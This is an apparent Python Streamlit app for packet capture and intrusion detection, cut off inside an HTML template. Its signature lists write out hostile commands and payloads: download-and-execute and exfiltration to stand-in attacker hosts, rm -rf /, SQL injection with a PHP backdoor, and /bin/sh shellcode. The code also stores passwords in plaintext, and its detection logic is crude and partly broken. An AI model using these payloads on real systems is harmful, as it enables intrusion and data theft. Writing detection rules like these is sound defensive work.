import streamlit as st
import pandas as pd
import matplotlib.pyplot as plt
from scapy.all import sniff
import firebase_admin
from firebase_admin import credentials, db
import joblib
import networkx as nx
import traceback
import os
import base64
from firebase_admin import messaging
import time
import datetime
from scapy.all import TCP, ICMP, send
from dotenv import load_dotenv

load_dotenv()

# Firebase Admin SDK initialization with environment variables
def initialize_firebase():
    try:
        firebase_admin.get_app("network")
    except ValueError:
        # Initialize Firebase Admin SDK with environment variables
        cred = credentials.Certificate(os.getenv("FIREBASE_CREDENTIALS_FILE"))
        firebase_admin.initialize_app(cred, {
            'databaseURL': os.getenv("FIREBASE_DATABASE_URL")
        }, name='network')

# Call initialize_firebase function to initialize Firebase Admin SDK
initialize_firebase()

# Function to save user data
def save_user_data(email, password):
    try:
        initialize_firebase()  # Ensure Firebase is initialized
        ref = db.reference('users', app=firebase_admin.get_app("network"))
        new_user_ref = ref.push({
            'email': email,
            'password': password
        })
    except Exception as e:
        st.error(f"Error occurred while registering user: {e}")

# Function to send alert to registered users
def send_alert_to_users(users, alert_message):
    try:
        initialize_firebase()  # Ensure Firebase is initialized
        for user in users:
            message = messaging.Message(
                data={
                    'title': 'DDoS Attack Detected!',
                    'body': alert_message
                },
                token=user['token']
            )
            response = messaging.send(message)
            print('Successfully sent message:', response)
    except Exception as e:
        st.error(f"Error occurred while sending alert: {e}")

def save_basic_info_to_firebase(email, data):
    # Convert 'Time' column to string
    data['Time'] = data['Time'].astype(str)
    
    # Convert DataFrame to JSON format
    data_json = data.to_json(orient='records')
    
    # Prepare basic information dictionary
    basic_info = {
        "total_packets": int(len(data)),
        "unique_protocols": int(data['Protocol'].nunique()),
        "unique_source_addresses": int(data['Source'].nunique()),
        "unique_destination_addresses": int(data['Destination'].nunique()),
        "average_packet_size": round(float(data['Length'].mean()), 2),
        "most_common_payload": data['Payload'].value_counts().idxmax(),
        "malicious_packets": int((data['Label'] == 'malicious').sum()),
        "incoming_packets": int((data['Direction'] == 'Incoming').sum()),
        "outgoing_packets": int((data['Direction'] == 'Outgoing').sum())
    }

    try:
        initialize_firebase()  # Ensure Firebase is initialized
        # Connect to Firebase
        ref = db.reference('basic_information', app=firebase_admin.get_app("network"))
        
        # Save basic information dictionary to Firebase under user's email node
        user_ref = ref.child(email.replace('.', ','))
        user_ref.set(basic_info)
    except Exception as e:
        st.error(f"Error occurred while saving basic information to Firebase: {e}")
    
def visualize_distributions(df, images_dir):
    # Create the directory if it doesn't exist
    if not os.path.exists(images_dir):
        os.makedirs(images_dir)

    # Calculate Protocol distribution
    protocol_counts = df["Protocol"].value_counts()

    # Plot Protocol distribution using a pie chart
    plt.figure(figsize=(10, 6))
    protocol_counts.plot(kind='pie', autopct='%1.1f%%', startangle=140)
    plt.title('\n\nProtocol Distribution\n\n', fontsize=18, fontweight='bold')
    plt.ylabel('')
    plt.savefig(os.path.join(images_dir, '01_protocol_pie_chart.png'), bbox_inches='tight')
    plt.close()

    # Create a directed graph
    G = nx.from_pandas_edgelist(df, source='Source', target='Destination', create_using=nx.DiGraph())

    # Draw the graph
    plt.figure(figsize=(12, 8))
    pos = nx.spring_layout(G)  # positions for all nodes
    nx.draw(G, pos, with_labels=True, node_color='skyblue', node_size=1000, edge_color='gray', arrowsize=20)
    plt.title("\n\nNetwork Graph of Traffic Flow\n\n", fontsize=18, fontweight='bold')
    plt.savefig(os.path.join(images_dir, '05_network_graph.png'), bbox_inches='tight')
    plt.close()

    # Plot histogram of length distribution
    plt.figure(figsize=(10, 6))
    plt.hist(df['Length'], bins=20, color='skyblue', edgecolor='black')
    plt.title('\n\nLength Distribution\n\n', fontsize=18, fontweight='bold')
    plt.xlabel('Length')
    plt.ylabel('Frequency')
    plt.savefig(os.path.join(images_dir, '04_length_histogram.png'), bbox_inches='tight')
    plt.close()
    
    

    # Calculate counts of malicious and non-malicious packets
    label_counts = df['Label'].value_counts()
    # Plot pie chart of malicious and non-malicious packets
    plt.figure(figsize=(8, 8))
    label_counts.plot(kind='pie', autopct='%1.1f%%', startangle=140)
    plt.title('\n\nMalicious vs. Non-Malicious Packets\n\n', fontsize=18, fontweight='bold')
    plt.ylabel('')
    plt.legend(['Non-Malicious', 'Malicious'], loc='upper right')
    plt.savefig(os.path.join(images_dir, '11_malicious_vs_non_malicious_pie_chart.png'), bbox_inches='tight')
    plt.close()

    # Calculate counts of outgoing and incoming packets
    direction_counts = df['Direction'].value_counts()
    # Plot pie chart of outgoing and incoming packets
    plt.figure(figsize=(8, 8))
    direction_counts.plot(kind='pie', autopct='%1.1f%%', startangle=140)
    plt.title('\n\nOutgoing vs. Incoming Packets\n\n', fontsize=18, fontweight='bold')
    plt.ylabel('')
    plt.legend(['Outgoing', 'Incoming'], loc='upper right')
    plt.savefig(os.path.join(images_dir, '12_outgoing_vs_incoming_pie_chart.png'), bbox_inches='tight')
    plt.close()

    # Return paths to the saved images
    return {
        'protocol_pie_chart': os.path.join(images_dir, '01_protocol_pie_chart.png'),
        'network_graph': os.path.join(images_dir, '05_network_graph.png'),
        'length_distribution': os.path.join(images_dir, '04_length_histogram.png'),
        'label_distribution': os.path.join(images_dir, '11_malicious_vs_non_malicious_pie_chart.png'),
        'direction_distribution': os.path.join(images_dir, '12_outgoing_vs_incoming_pie_chart.png'),
        
    }

def disrupt_communication(packet_data):
    dropped_packets_indices = []
    for idx, packet in packet_data.iterrows():
        # Label packets based on multiple criteria
        label = packet['Label']

        # Check if packet is malicious based on your criteria
        if label == 'malicious':
            dropped_packets_indices.append(idx)
            # Craft a TCP reset packet to disrupt communication
            if packet["Protocol"] == "TCP":
                reset_packet = TCP(dport=int(packet["Destination"]), sport=int(packet["Source"]), flags="R")
                # Send the reset packet
                send(reset_packet, verbose=False)
                print(f"Sent TCP reset packet to disrupt communication with {packet['Destination']}")

            # Craft an ICMP packet to disrupt communication
            elif packet["Protocol"] == "ICMP":
                icmp_error_packet = ICMP(type=3, code=1)  # Destination Unreachable, Host Unreachable
                # Send the ICMP error packet
                send(icmp_error_packet, verbose=False)
                print(f"Sent ICMP error packet to disrupt communication with {packet['Destination']}")

    # Drop the malicious packets from DataFrame
    modified_packet_data = packet_data.drop(dropped_packets_indices)
    return modified_packet_data

def detect_packet_loss(data):
    # Convert 'Time' column to datetime objects
    data['Time'] = pd.to_datetime(data['Time'])

    # Sort the data by 'Time' to ensure chronological order
    data.sort_values(by='Time', inplace=True)

    # Group data by communication sessions (e.g., based on source and destination)
    grouped_data = data.groupby(['Source', 'Destination'])

    # Initialize variables to track packet loss
    total_packets = 0
    received_packets = 0

    # Iterate over each group
    for _, group_df in grouped_data:
        # Sort packets within each session by time
        group_df.sort_values(by='Time', inplace=True)

        # Iterate over packets in the session
        prev_packet_time = None
        for index, packet in group_df.iterrows():
            # Check if the current packet follows the previous packet in time
            if prev_packet_time is not None and packet['Time'] != prev_packet_time:
                # Detect packet loss
                time_interval = packet['Time'] - prev_packet_time
                lost_packets_count = int(time_interval.total_seconds() - 1)  # Convert time difference to seconds
                total_packets += lost_packets_count

            # Update previous packet time
            prev_packet_time = packet['Time']
            received_packets += 1

    # Calculate packet loss rate
    packet_loss_rate = (total_packets / (total_packets + received_packets)) * 100
    return packet_loss_rate


def capture_and_save_packets(interface, duration, file_path=None):
    captured_data = []


    # Define a dictionary mapping port numbers to application names
    port_to_application = {
    1: "TCPMUX",
    5: "RJE",
    7: "ECHO",
    9: "DISCARD",
    11: "SYSTAT",
    13: "DAYTIME",
    17: "QOTD",
    18: "Message Send Protocol (MSP)",
    19: "CHARGEN",
    20: "FTP",
    21: "FTP Control",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    37: "TIME",
    42: "Nameserver",
    43: "WHOIS",
    49: "TACACS",
    53: "DNS",
    67: "DHCP Server",
    68: "DHCP Client",
    69: "TFTP",
    70: "Gopher",
    79: "Finger",
    80: "HTTP",
    88: "Kerberos",
    102: "ISO-TSAP",
    105: "CCSO name server protocol",
    107: "Remote Telnet Service",
    109: "POP2",
    110: "POP3",
    111: "Sun Remote Procedure Call",
    113: "Ident",
    115: "SFTP",
    117: "UUCP Path Service",
    119: "NNTP",
    123: "NTP",
    137: "NetBIOS Name Service",
    138: "NetBIOS Datagram Service",
    139: "NetBIOS Session Service",
    143: "IMAP",
    161: "SNMP",
    162: "SNMP Trap",
    179: "BGP",
    194: "IRC",
    199: "SMUX",
    201: "AppleTalk-Router",
    204: "AppleTalk-Echo",
    206: "AppleTalk-Zone Information",
    209: "The Quick Mail Transfer Protocol",
    210: "ANSI Z39.50",
    213: "IPX",
    220: "IMAP3",
    245: "LINK",
    347: "FATMEN",
    363: "RSVP Tunnel",
    369: "RPC2 Portmapper",
    370: "codaauth2",
    389: "LDAP",
    427: "SLP (Service Location Protocol)",
    443: "HTTPS",
    444: "Simple Network Paging Protocol (SNPP)",
    445: "Microsoft-DS",
    464: "Kerberos Change/Set password",
    500: "ISAKMP",
    512: "exec",
    513: "Login",
    514: "Shell",
    515: "Line Printer Spooler",
    517: "Talk",
    518: "NTalk",
    520: "Routing Information Protocol (RIP)",
    525: "Time Server",
    530: "RPC",
    531: "Chat",
    532: "Readnews",
    533: "for emergency broadcasts",
    540: "UUCP",
    543: "KLogin",
    544: "KShell",
    546: "DHCPv6 Client",
    547: "DHCPv6 Server",
    548: "AFP (Apple Filing Protocol)",
    549: "IDFP",
    550: "new-who",
    556: "rfs server",
    563: "NNTP over SSL",
    587: "Message Submission",
    591: "FileMaker Inc. - HTTP Alternate (see Port 80)",
    636: "LDAPS",
    666: "Doom",
    690: "Velodrome",
    691: "MS Exchange Routing",
    692: "Hyperwave-ISP",
    694: "Linux-HA (High Availability)",
    695: "IEEE-MMS-SSL",
    698: "OLSR",
    699: "Access Network",
    700: "EPP (Extensible Provisioning Protocol)",
    701: "Link Management Protocol (LMP)",
    702: "IRIS over BEEP",
    704: "Errlog Protocol",
    705: "AgentX",
    706: "SILC",
    707: "Borland DSJ",
    709: "Entrust Key Management Service Handler",
    710: "Entrust Administration Service Handler",
    711: "Cisco TDP",
    712: "Topology Broadcast based on Reverse-Path Forwarding routing protocol (TBRPF)",
    720: "SMQP",
    729: "IBM NetView DM/6000 Server/Client",
    749: "Kerberos Administration",
    750: "Kerberos version IV",
    765: "webster",
    777: "Multiling HTTP",
    780: "wpgs",
    786: "Concert",
    800: "mdbs_daemon",
    801: "device",
    808: "CCProxy",
    843: "Adobe Flash Policy Server",
    873: "rsync",
    888: "cddbp-alt",
    902: "VMware Server Console",
    903: "VMware Remote Console",
    944: "Network File System over RDMA",
    989: "FTP over SSL (data)",
    990: "FTP over SSL (control)",
    991: "NAS (Netnews Administration System)",
    992: "Telnet over SSL",
    993: "IMAPS",
    995: "POP3S",
    999: "Kerberos 5 (AS)",
    1000: "Kerberos 5 (TGS)",
    1010: "surf",
    1021: "RFC3692-style Experiment 1 (*)",
    1022: "RFC3692-style Experiment 2 (*)",
    1023: "Reserved",
    1024: "Reserved",
    1025: "Network Blackjack",
    1026: "Calendar Access Protocol",
    1027: "Alternative World Games",
    1028: "Deprecated (TCP)",
    1029: "Solid Mux Server",
    1030: "BBN IAD",
    1031: "InetInfo",
    1032: "BBN IAD",
    1033: "LocalInfo-SDDP",
    1034: "ActiveSync Notifications",
    1035: "MX-XR RPC",
    1036: "Nebula Secure Segment Transfer Protocol",
    1037: "AMS",
    1038: "MTQP",
    1039: "Streamlined Blackhole",
    1040: "Netarx Netcare",
    1041: "AK2 Product",
    1042: "Subnet Roaming",
    1043: "BOINC Client Control",
    1044: "Dev Consortium Utility",
    1045: "Fingerprint Image Transfer Protocol",
    1046: "WebFilter Remote Monitor",
    1047: "Sun's NEO Object Request Broker",
    1048: "Sun's NEO Object Request Broker",
    1049: "Tobit David Postman VPMN",
    1050: "CORBA Management Agent",
    1051: "Optima VNET",
    1052: "Dynamic DNS Tools",
    1053: "Remote Assistant (RA)",
    1054: "BRVREAD",
    1055: "ANSYS - License Manager",
    1056: "VFO",
    1057: "Startron",
    1058: "nim",
    1059: "nimreg",
    1060: "POLESTAR",
    1061: "KIOSK",
    1062: "Veracity",
    1063: "KyoceraNetDev",
    1064: "JSTEL",
    1065: "SYSCOMLAN",
    1066: "FPO-FNS",
    1067: "Installation Bootstrap Proto. Serv.",
    1068: "Installation Bootstrap Proto. Cli.",
    1069: "COGNEX-INSIGHT",
    1070: "GMRUpdateSERV",
    1071: "BSQUARE-VOIP",
    1072: "CARDAX",
    1073: "BridgeControl",
    1074: "FASTechnologies License Manager",
    1075: "RDRMSHC",
    1076: "DAB STI-C",
    1077: "IMGames",
    1078: "eManageCstp",
    1079: "ASPROVATalk",
    1080: "Socks",
    1081: "PVUNIWIEN",
    1082: "AMT-ESD-PROT",
    1083: "Anasoft License Manager",
    1084: "Anasoft License Manager",
    1085: "WebObjects",
    1086: "CPL Scrambler Logging",
    1087: "CPL Scrambler Internal",
    1088: "CPL Scrambler Alarm Log",
    1089: "FF Annunciation",
    1090: "FF Fieldbus Message Specification",
    1091: "FF System Management",
    1092: "Open Business Reporting Protocol",
    1093: "PROOFD",
    1094: "ROOTD",
    1095: "NICELink",
    1096: "Common Name Resolution Protocol",
    1097: "Sun Cluster Manager",
    1098: "RMI Activation",
    1099: "RMI Registry",
    1100: "MCTP",
    1101: "PT2-DISCOVER",
    1102: "ADOBE SERVER 1",
    1103: "ADOBE SERVER 2",
    1104: "XRL",
    1105: "FTRANHC",
    1106: "ISOIPSIGPORT-1",
    1107: "ISOIPSIGPORT-2",
    1108: "ratio-adp",
    1109: "Reserved",
    1110: "Reserved",
    1111: "LM Social Server",
    1112: "Intelligent Communication Protocol",
    1113: "Licklider Transmission Protocol",
    1114: "Mini SQL",
    1115: "ARDUS Transfer",
    1116: "ARDUS Control",
    1117: "ARDUS Multicast Transfer",
    1118: "SACRED",
    1119: "Battle.net Chat/Game Protocol",
    1120: "Battle.net File Transfer Protocol",
    1121: "Reserved",
    1122: "availant-mgr",
    1123: "Murray",
    1124: "HP VMM Control",
    1125: "HP VMM Agent",
    1126: "HP VMM Agent",
    1127: "SUP debugging",
    1128: "SAPHostControl over SOAP/HTTP",
    1129: "SAPHostControl over SOAP/HTTPS",
    1130: "CAC App Service Protocol Encripted",
    1131: "CAC App Service Protocol Encripted",
    1132: "KVM-via-IP Management Service",
    1133: "Data Flow Network",
    1134: "MicroAPL APLX",
    1135: "OmniVision Communication Service",
    1136: "HHB Gateway Control",
    1137: "TRIM Workgroup Service",
    1138: "encrypted admin requests",
    1139: "encrypted admin requests",
    1140: "AutoNOC Network Operations Protocol",
    1141: "User Message Service",
    1142: "User Discovery Service",
    1143: "Infomatryx Exchange",
    1144: "FusionScript",
    1145: "X9 iCue Show Control",
    1146: "audit transfer",
    1147: "CAPIoverLAN",
    1148: "elfiq-repl",
    1149: "Blue Cherry",
    1150: "Blaze",
    1151: "Unizensus Login Server",
    1152: "Winpopup LAN Messenger",
    1153: "ANSI C12.22 Port",
    1154: "Community Service",
    1155: "Network File Access",
    1156: "iasControl OMS",
    1157: "Oracle iASControl",
    1158: "dbControl OMS",
    1159: "Oracle OMS",
    1160: "DB Lite Mult-User Server",
    1161: "Health Polling",
    1162: "Health Trap",
    1163: "SmartDialer Data Protocol",
    1164: "QSM Proxy Service",
    1165: "QSM GUI Service",
    1166: "QSM RemoteExec",
    1167: "Cisco IP SLAs Control Protocol",
    1168: "VChat Conference Service",
    1169: "TRIPWIRE",
    1170: "AT+C License Manager",
    1171: "AT+C FmiApplicationServer",
    1172: "DNA Protocol",
    1173: "D-Cinema Request-Response",
    1174: "FlashNet Remote Admin",
    1175: "Dossier Server",
    1176: "Indigo Home Server",
    1177: "DKMessenger Protocol",
    1178: "SGI Storage Manager",
    1179: "Backup To Neighbor",
    1180: "Millicent Client Proxy",
    1181: "3Com Net Management",
    1182: "AcceleNet Control",
    1183: "LL Surfup HTTP",
    1184: "LL Surfup HTTPS",
    1185: "Catchpole port",
    1186: "MySQL Cluster Manager",
    1187: "Alias Service",
    1188: "HP Web Admin",
    1189: "Unet Connection",
    1190: "CommLinx GPS / AVL System",
    1191: "General Parallel File System",
    1192: "caids sensors channel",
    1193: "Five Across Server",
    1194: "OpenVPN",
    1195: "RSF-1 clustering",
    1196: "Network Magic",
    1197: "Carrius Remote Access",
    1198: "cajo reference discovery",
    1199: "DMIDI",
    1200: "scol",
    1201: "Nucleus Sand Database Server",
    1202: "caiccipc",
    1203: "License Validation",
    1204: "Log Request Listener",
    1205: "Accord-MGC",
    1206: "Anthony Data",
    1207: "MetaSage",
    1208: "SEAGULL AIS",
    1209: "IPCD3",
    1210: "EOSS",
    1211: "Groove DPP",
    1212: "lupa",
    1213: "MPC LIFENET",
    1214: "KAZAA",
    1215: "scanSTAT 1.0",
    1216: "ETEBAC 5",
    # Add more port numbers and corresponding application names as needed
}


    # Define malicious keywords to search for in packet payload
    malicious_keywords = ["malware", "virus", "exploit"]

    cryptojacking_signatures = [
    "Coinhive",  # Example cryptojacking script signature
    "CoinImp",  # Another cryptojacking script signature
    "Crypto-Loot",  # Another cryptojacking script signature
    "JSEcoin",  # Another cryptojacking script signature
    "CoinHave",  # Another cryptojacking script signature
    "CoinNebula",  # Another cryptojacking script signature
    "CoinBlind",  # Another cryptojacking script signature
    "Mineralt",  # Another cryptojacking script signature
    "DeepMiner",  # Another cryptojacking script signature
    "CoinImp",  # Another cryptojacking script signature
    # Add more cryptojacking signatures here...
]
    mitm_signatures = [
    "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n",  # Example MitM attack pattern
    "HTTP/1.1 301 Moved Permanently\r\nLocation: http://malicious-site.com/evil-page\r\n\r\n",  # Another MitM attack pattern
    "HTTP/1.1 302 Found\r\nLocation: http://malicious-site.com/evil-page\r\n\r\n",  # Another MitM attack pattern
    "HTTP/1.1 307 Temporary Redirect\r\nLocation: http://malicious-site.com/evil-page\r\n\r\n",  # Another MitM attack pattern
    "<script src='http://malicious-site.com/evil.js'></script>",  # Another MitM attack pattern
    "<img src='http://malicious-site.com/evil.png'>",  # Another MitM attack pattern
    "<iframe src='http://malicious-site.com/evil.html'></iframe>",  # Another MitM attack pattern
    "<link rel='stylesheet' href='http://malicious-site.com/evil.css'>",  # Another MitM attack pattern
    "<embed src='http://malicious-site.com/evil.swf'></embed>",  # Another MitM attack pattern
    "Location: http://malicious-site.com/evil-page",  # Another MitM attack pattern
    # Add more MitM attack signatures here...
]
    data_exfiltration_signatures = [
    "POST /exfiltrate-data HTTP/1.1",  # Example data exfiltration pattern
    "GET /leak-info HTTP/1.1",  # Another data exfiltration pattern
    "PUT /send-data HTTP/1.1",  # Another data exfiltration pattern
    "HTTP/1.1 200 OK\r\nContent-Disposition: attachment; filename='sensitive_data.txt'\r\n",  # Another data exfiltration pattern
    "Content-Type: application/octet-stream\r\nContent-Disposition: attachment; filename='leaked_data.txt'\r\n",  # Another data exfiltration pattern
    "Content-Disposition: attachment; filename='export.csv'\r\n",  # Another data exfiltration pattern
    "Content-Disposition: form-data; name='file'; filename='exfiltrated_data.txt'\r\nContent-Type: text/plain\r\n",  # Another data exfiltration pattern
    "Content-Disposition: form-data; name='payload'; filename='leak.txt'\r\nContent-Type: application/octet-stream\r\n",  # Another data exfiltration pattern
    "X-Forwarded-For: malicious-server.com",  # Another data exfiltration pattern
    "X-Custom-Header: leak-info",  # Another data exfiltration pattern
    # Add more data exfiltration signatures here...
]
    csrf_signatures = [
    "<img src='http://malicious-site.com/transfer-funds'>",  # Example CSRF pattern
    "<form action='http://malicious-site.com/transfer-funds' method='POST'>",  # Another CSRF pattern
    "<a href='http://malicious-site.com/delete-account'>Click here to delete your account</a>",  # Another CSRF pattern
    "<input type='hidden' name='csrf_token' value='malicious_token'>",  # Another CSRF pattern
    "<iframe src='http://malicious-site.com/transfer-funds' style='display: none;'></iframe>",  # Another CSRF pattern
    "<script>document.location='http://malicious-site.com/transfer-funds';</script>",  # Another CSRF pattern
    "<link rel='stylesheet' href='http://malicious-site.com/evil.css'>",  # Another CSRF pattern
    "<embed src='http://malicious-site.com/evil.swf'>",  # Another CSRF pattern
    # Add more CSRF signatures here...
]
    command_injection_signatures = [
    "; ls -la",  # Example command injection pattern
    "; rm -rf /",  # Command injection to delete all files
    "; cat /etc/passwd",  # Command injection to read system password file
    "; wget http://malicious-site.com/malware.sh -O /tmp/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh",  # Command injection to download and execute remote script
    "; echo 'Malicious Content' > /var/www/html/index.html",  # Command injection to modify web server content
    "; curl -X POST -d 'malicious_data' http://attacker-server.com/data_receiver.php",  # Command injection to exfiltrate data to attacker server
    "; sudo useradd -p 'malicious_password' malicious_user",  # Command injection to create a new malicious user
    "; find / -name '*.txt'",  # Command injection to search for files on the system
    "; tar -czf /tmp/malicious.tar.gz /etc/passwd",  # Command injection to create a compressed archive of sensitive files
    "; ping -c 4 attacker-server.com",  # Command injection to perform a network ping to attacker server
    # Add more command injection signatures here...
]
    sql_injection_signatures = [
    "' OR '1'='1",  # SQL injection to bypass authentication
    "'; DROP TABLE users; --",  # SQL injection to delete database table
    "'; INSERT INTO users (username, password) VALUES ('attacker', 'password'); --",  # SQL injection to insert malicious data
    "' UNION SELECT * FROM credit_cards; --",  # SQL injection to retrieve data from another table
    "'; UPDATE users SET password='malicious_password' WHERE username='admin'; --",  # SQL injection to modify data
    "' OR username IS NULL; --",  # SQL injection to retrieve all records
    "'; EXEC xp_cmdshell 'net user attacker P@ssw0rd /add'; --",  # SQL injection to execute system command
    "'; SELECT LOAD_FILE('/etc/passwd'); --",  # SQL injection to read file contents
    "' UNION SELECT '<?php system($_GET['cmd']); ?>' INTO OUTFILE '/var/www/html/backdoor.php'; --",  # SQL injection to create PHP backdoor
    "' OR SLEEP(5); --",  # SQL injection to delay response
    # Add more SQL injection signatures here...
]
    buffer_overflow_signatures = [
    b'\x41' * 1000,  # Pattern of 'A's to trigger buffer overflow
    b'\x42' * 2000,  # Pattern of 'B's to trigger buffer overflow
    b'\x43' * 1500,  # Pattern of 'C's to trigger buffer overflow
    b'\x44' * 1800,  # Pattern of 'D's to trigger buffer overflow
    b'\x45' * 1200,  # Pattern of 'E's to trigger buffer overflow
    b'\x46' * 1600,  # Pattern of 'F's to trigger buffer overflow
    b'\x47' * 1400,  # Pattern of 'G's to trigger buffer overflow
    b'\x48' * 1700,  # Pattern of 'H's to trigger buffer overflow
    b'\x49' * 1900,  # Pattern of 'I's to trigger buffer overflow
    b'\x4a' * 1100,  # Pattern of 'J's to trigger buffer overflow
    # Add more buffer overflow signatures here...
]
    # Convert byte strings to regular strings
    buffer_overflow_signatures = [signature.hex() for signature in buffer_overflow_signatures]

    shellcode_signatures = [
    b'\x90\x90\x90\x90\x90\x90',  # NOP sled
    b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80',  # Linux execve("/bin/sh")
    b'\xcc\xcc\xcc\xcc\xcc\xcc',  # INT3 instruction
    b'\x41\x41\x41\x41\x41\x41',  # Pattern of 'A's
    b'\x42\x42\x42\x42\x42\x42',  # Pattern of 'B's
    b'\x43\x43\x43\x43\x43\x43',  # Pattern of 'C's
    b'\x44\x44\x44\x44\x44\x44',  # Pattern of 'D's
    b'\x45\x45\x45\x45\x45\x45',  # Pattern of 'E's
    b'\x46\x46\x46\x46\x46\x46',  # Pattern of 'F's
    b'\x47\x47\x47\x47\x47\x47',  # Pattern of 'G's
    # Add more shellcode signatures here...
]

    # Convert byte strings to regular strings
    shellcode_signatures = [signature.hex() for signature in shellcode_signatures]

    ddos_signatures = [
    b'\x00\x00\x08\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # UDP flood
    b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # Null packet flood
    b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff',  # Broadcast amplification
    b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # ICMP flood
    b'\x45\x00\x00\x28\x00\x00\x40\x00\x40\x01\x00\x00\xc0\xa8\x01\x01',  # Smurf attack
    b'\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # SYN flood
    b'\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # ACK flood
    b'\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # DNS amplification
    b'\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # NTP amplification
    b'\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # SSDP amplification
]
    
    # Convert byte strings to regular strings
    ddos_signatures = [signature.hex() for signature in ddos_signatures]



   # Define the callback function to handle captured packets
    def packet_handler(packet):
        if packet.haslayer("IP"):
            time = packet.time
            source = packet["IP"].src
            destination = packet["IP"].dst
            ip_version = packet["IP"].version
            payload = str(packet.payload) 
            direction = "Incoming" if source == interface else "Outgoing" # Get packet payload as string
            # Initialize an empty list to store application names
            applications = []
            protocol_numbers = []
            port = None
            flags = ''
            if packet.haslayer("TCP"):
                tcp = packet["TCP"]
                port = tcp. dport
                if port in port_to_application:
                    applications.append(port_to_application[port])
                else:
                    applications.append("Unknown")
                # Convert flags to string representation
                flags = str(packet.sprintf("%TCP.flags%"))
                # Add more TCP protocols as needed
            else:
                applications.append("TCP")
                protocol_numbers.append(port)

            # Check for UDP protocol
            if packet.haslayer("UDP"):
                udp = packet["UDP"]
                port = udp.dport
                # Add more UDP protocols as needed
                if port in port_to_application:
                    applications.append(port_to_application[port])
                else:
                    applications.append("Unknown")
                # Add more UDP protocols as needed
            else:
                applications.append("UDP")
                protocol_numbers.append(port)

            # Check for ICMP protocol
            if packet.haslayer("ICMP"):
                applications.append("ICMP")
                protocol_numbers.append(port)

            # Combine all detected applications into a single string
            application = applications[0]
            protocol_numbers = '/'.join(str(num) for num in protocol_numbers) if protocol_numbers else "Unknown"
            length = len(packet)

           # Define labels based on multiple criteria
            if port in [5060, 3389, 1433]:  # Malicious port numbers
                label = 'malicious'
            elif any(keyword in payload.lower() for keyword in malicious_keywords):  # Search for malicious keywords in payload
                label = 'malicious'
            elif 'F' in flags or 'R' in flags:  # Check for FIN or RST flags
                label = 'malicious'
            elif any(signature in payload for signature in cryptojacking_signatures):  # Check for cryptojacking signatures
                label = 'malicious'
            elif any(signature in payload for signature in mitm_signatures):  # Check for cryptojacking signatures
                label = 'malicious'
            elif any(signature in payload for signature in data_exfiltration_signatures):  # Check for cryptojacking signatures
                label = 'malicious'
            elif any(signature in payload for signature in csrf_signatures):  # Check for cryptojacking signatures
                label = 'malicious'
            elif any(signature in payload for signature in command_injection_signatures):  
                label = 'malicious'
            elif any(signature in payload for signature in sql_injection_signatures):   
                label = 'malicious'
            elif any(signature in payload for signature in buffer_overflow_signatures): 
                label = 'malicious'
            elif any(signature in payload for signature in shellcode_signatures):  
                label = 'malicious'
            elif any(signature in payload for signature in ddos_signatures):  
                label = 'malicious'
            else:
                label = 'non-malicious'

           
            captured_data.append([time, source, destination, direction, application, ip_version, protocol_numbers, length, flags, payload, label])

    # Capture packets from the specified interface for the specified duration
    sniff(iface=interface, prn=packet_handler, timeout=duration)

    # Convert captured packets to a DataFrame
    df = pd.DataFrame(captured_data, columns=["Time", "Source", "Destination", "Direction", "Protocol", "IP Version", "Protocol number", "Length", "Flags", "Payload", "Label"])

    if file_path:
        # Save the DataFrame to a CSV file
        df.to_csv(file_path, index=False)

    # Display the DataFrame
    st.subheader("Captured Packets")
    st.write(df)

def apply_basic_info_css():
    """
    Apply enhanced CSS to style the Basic Information section attractively.
    """
    st.markdown(
        """
        <style>
        .basic-info {
            padding: 1rem !important;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            background-color: #f9f9f9 !important;
        }
        .basic-info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1rem;
        }
        .basic-info-label {
            font-weight: bold;
            font-size: 1.1rem;
            color: #333;
            flex: 1;
            margin-right: 1rem;
        }
        .basic-info-value {
            font-size: 1.1rem;
            color: #555;
            flex: 1;
        }
        .basic-info hr {
            margin: 1rem 0;
            border: none;
            border-top: 1px solid #ddd;
        }
        </style>
        """,
        unsafe_allow_html=True
    )

def display_dashboard(data):
    # Apply enhanced CSS for Basic Information section
    apply_basic_info_css()

    # Basic Information Section
    st.header("Network Information\n\n\n")
    st.markdown(
        f"""
        <div class="basic-info">
            <div class="basic-info-row">
                <div class="basic-info-label">Total Packets</div>
                <div class="basic-info-value">{len(data)}</div>
            </div>
            <hr>
            <div class="basic-info-row">
                <div class="basic-info-label">Unique Protocols</div>
                <div class="basic-info-value">{data['Protocol'].nunique()}</div>
            </div>
            <hr>
            <div class="basic-info-row">
                <div class="basic-info-label">Unique Source Addresses</div>
                <div class="basic-info-value">{data['Source'].nunique()}</div>
            </div>
            <hr>
            <div class="basic-info-row">
                <div class="basic-info-label">Unique Destination Addresses</div>
                <div class="basic-info-value">{data['Destination'].nunique()}</div>
            </div>
            <hr>
            <div class="basic-info-row">
                <div class="basic-info-label">Average Packet Size</div>
                <div class="basic-info-value">{data['Length'].mean():.2f} bytes</div>
            </div>
            <hr>
            <div class="basic-info-row">
                <div class="basic-info-label">Most Common Payload</div>
                <div class="basic-info-value">{data['Payload'].value_counts().idxmax()}</div>
            </div>
            <hr>
            <div class="basic-info-row">
                <div class="basic-info-label">Malicious Packets</div>
